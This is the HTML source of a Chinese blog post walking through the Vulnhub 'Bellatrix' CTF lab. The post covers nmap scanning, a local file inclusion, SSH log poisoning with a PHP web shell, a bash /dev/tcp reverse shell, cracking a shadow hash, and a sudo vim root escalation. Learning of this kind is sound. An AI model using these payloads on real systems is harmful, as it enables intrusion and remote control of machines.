@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub Bellatrix - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.71 Host is up (0.0079s latency). 机器 IP 为 10.1.1.71。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务和" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/vulnhub-bellatrix/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub Bellatrix" />
+<meta property="og:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.71 Host is up (0.0079s latency). 机器 IP 为 10.1.1.71。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务和" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/vulnhub-bellatrix/" />
+<meta property="article:published_time" content="2021-06-28T12:34:48+08:00" />
+<meta property="article:modified_time" content="2021-06-28T12:34:48+08:00" />
+<meta itemprop="name" content="Vulnhub Bellatrix">
+<meta itemprop="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.71 Host is up (0.0079s latency). 机器 IP 为 10.1.1.71。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务和">
+<meta itemprop="datePublished" content="2021-06-28T12:34:48+08:00" />
+<meta itemprop="dateModified" content="2021-06-28T12:34:48+08:00" />
+<meta itemprop="wordCount" content="682">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub Bellatrix"/>
+<meta name="twitter:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.71 Host is up (0.0079s latency). 机器 IP 为 10.1.1.71。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务和"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Josephine&#39;s Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Josephine&#39;s Blog</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub Bellatrix</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-28 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#枚举">枚举</a>
+      <ul>
+        <li><a href="#确定-ip-地址">确定 IP 地址</a></li>
+        <li><a href="#端口扫描及服务枚举">端口扫描及服务枚举</a></li>
+        <li><a href="#80-端口枚举">80 端口枚举</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-shell">Initial Shell</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="枚举">枚举</h1>
+<h2 id="确定-ip-地址">确定 IP 地址</h2>
+<p>使用 nmap 进行探活：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sn 10.1.1.0/24
+Nmap scan report <span class="k">for</span> 10.1.1.71
+Host is up <span class="o">(</span>0.0079s latency<span class="o">)</span>.</code></pre></td></tr></table>
+</div>
+</div>
+<p>机器 IP 为 <strong>10.1.1.71</strong>。</p>
+<h2 id="端口扫描及服务枚举">端口扫描及服务枚举</h2>
+<p>进行全 TCP 端口扫描，同时枚举服务和操作系统的信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.1.1.71
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.3p1 Ubuntu <span class="m">1</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">3072</span> 4b:ce:c7:5a:9c:1f:8b💿47:03:08:69:85:c2:91:49 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/bwY81tB42mSyc6zYJ/AOnh3jHajzW/39q0CZ0olSSKgdTuCKf7MbgI6NIxvSYa4HbqiBURvDNhg6I33tSPOOAcHaU/g5kDIVrLPp737Kt8GZAL6ZKTbYTfxZbwChshA+UkFRjAQCewxxGk41LwTU4Tv09sAfWGkQt1/IzoXNdETUyZYf6JmT8GNimDgnQTscgUUH1PugEUvVKXYO27XxvZi/2lHwSjT+6CyuRHnXyu2XI8XhHPwt6zY9fzbSdgVYnVRevz0le4L4gr46+xRzrA7/cH9c9NMBAmMswj6UB2jBKnhEOUGUdX+xWGCqnlL96l2bXGH+iOFlJL1xxfzsL//F8OG/BytkAVoirjox86NRUedA754os9gfK156yhT2y1SD5aLDmn0fzc5d7ODF7qrKrpNCr1kwoxlqU9HlWnFS879GwFd/ikfL6sboE/dyFqzIE46UpaMum6L3s/MS4nieT8mZqD2zWgQyErOpOmfrhRvEsVWaxh7joJC13aU<span class="o">=</span>
+<span class="p">|</span>   <span class="m">256</span> a1:2a:a8:15:99:04:cc:2a:1e:e3:50:00:f3:55:c2:cc <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZmILziKuclSl5WRf0NLeZCoARHS92nY7F0bYt/P5VKYcTi65Dm9ShCGU2JiiHunTLoYLCHz+sC67CrL2SSk2I<span class="o">=</span>
+<span class="p">|</span>   <span class="m">256</span> 2c:d3:ec:6f:4f:5b:4a:e0:ea:0a:c3:0d:2f:cb:78:17 <span class="o">(</span>ED25519<span class="o">)</span>
+<span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHrTaRt7JldfRhvQCYEsMeC7vLv3QFA1MdIeInt3HPB0
+80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: AvadaKedavra
+Aggressive OS guesses: Linux 2.6.32 <span class="o">(</span>96%<span class="o">)</span>, Linux 4.4 <span class="o">(</span>96%<span class="o">)</span>, Linux 2.6.32 or 3.10 <span class="o">(</span>95%<span class="o">)</span>, Linux 2.6.32 - 2.6.35 <span class="o">(</span>94%<span class="o">)</span>, Linux 2.6.32 - 2.6.39 <span class="o">(</span>94%<span class="o">)</span>, Linux 4.0 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.11 - 4.1 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 3.8 <span class="o">(</span>92%<span class="o">)</span>, Linux 5.0 - 5.4 <span class="o">(</span>92%<span class="o">)</span>, Linux 2.6.18 <span class="o">(</span>92%<span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>开放了两个端口—— 22 和 80，运行着 openssh 和 apache。</p>
+<h2 id="80-端口枚举">80 端口枚举</h2>
+<p>主页简单粗暴：</p>
+<p><img src="/images/2021-06-29/index.webp" alt="index"></p>
+<p>查看页面源代码，注释中包含以下内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- 
+</span><span class="c">    Nah...this time there are no clues in the source code ... 
+</span><span class="c">    o yeah, maybe I&#39;ve already told you a directory .php? :)
+</span><span class="c">
+</span><span class="c">--&gt;</span>
+
+/*
+
+ $file = $_GET[&#39;file&#39;];
+ if(isset($file))
+ {
+     include(&#34;$file&#34;);
+ }
+
+*/</code></pre></td></tr></table>
+</div>
+</div>
+<p>访问 /ikilledsiriusblack.php，和主页一致：</p>
+<p><img src="/images/2021-06-29/ikilledsiriusblack.webp" alt="ikilledsiriusblack"></p>
+<p>尝试注释中的文件包含，只有 ikilledsiriusblack.php 可行：</p>
+<p><img src="/images/2021-06-29/include.webp" alt="include"></p>
+<h1 id="initial-shell">Initial Shell</h1>
+<p>与之前一台相同，通过 LFI 来 get shell。经过尝试，/var/log/auth.log 可以读取，且开放 SSH 服务：</p>
+<p><img src="/images/2021-06-29/auth.webp" alt="auth"></p>
+<p>尝试注入 phpinfo：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span>@10.1.1.71</code></pre></td></tr></table>
+</div>
+</div>
+<p>成功投毒：</p>
+<p><img src="/images/2021-06-29/phpinfo.webp" alt="phpinfo"></p>
+<p>然后注入一句话：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh <span class="s1">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span>@10.1.1.71</code></pre></td></tr></table>
+</div>
+</div>
+<p>使用 bash reverse payload，成功反弹 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://10.1.1.71/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=exec bash -c &#34;bash -i &gt;/dev/tcp/192.168.17.48/8080 0&gt;&amp;1&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2021-06-29/rev.webp" alt="rev"></p>
+<p>获取到 Initial Shell。</p>
+<h1 id="提权">提权</h1>
+<p>在 /var/www/html 下发现一目录，名称明显为 base64 编码的结果，经过解密为 secrets，其中包含一个包含用户名和 hash 的文件和一个隐藏文件，怀疑为字典。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">lestrange:$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0
+</code></pre></td></tr></table>
+</div>
+</div><p>使用 john 及字典进行破解，得到密码为 ihateharrypotter。切换至 lestrange 账户，查看其所能执行的 sudo 命令：</p>
+<p><img src="/images/2021-06-29/su.webp" alt="su"></p>
+<p>可以 sudo 执行 vim，直接利用 vim 提权至 root：</p>
+<p><img src="/images/2021-06-29/vim.webp" alt="vim"></p>
+<p><img src="/images/2021-06-29/root.webp" alt="root"></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-06-28
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/vulnhub-tomato/">
+            <span class="next-text nav-default">Vulnhub Tomato</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2020 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
